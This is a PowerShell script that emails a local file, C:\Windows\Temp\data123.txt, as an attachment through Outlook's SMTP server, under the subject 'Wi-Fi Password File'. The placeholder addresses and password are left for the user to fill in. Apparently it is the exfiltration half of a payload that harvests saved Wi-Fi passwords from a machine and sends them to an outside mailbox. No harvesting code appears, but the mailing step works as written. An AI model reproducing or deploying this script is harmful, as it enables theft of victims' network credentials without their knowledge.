$smtpServer = "smtp-mail.outlook.com"
$smtpPort = 587
$smtpUser = "example@outlook.com"
$smtpPass = "YOURPASSWORDHERE"

$from = "example@outlook.com"
$to = "example@outlook.com"

$subject = "Wi-Fi Password File"
$body = "test message"

$attachment = "C:\\Windows\\Temp\\data123.txt"

$emailMessage = New-Object System.Net.Mail.MailMessage
$emailMessage.From = $from
$emailMessage.To.Add($to)
$emailMessage.Subject = $subject
$emailMessage.Body = $body

$attachment = New-Object System.Net.Mail.Attachment($attachment)
$emailMessage.Attachments.Add($attachment)

$SMTPClient = New-Object System.Net.Mail.SmtpClient($smtpServer, $smtpPort)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($smtpUser, $smtpPass)

$SMTPClient.Send($emailMessage)

"Email sent successfully!"
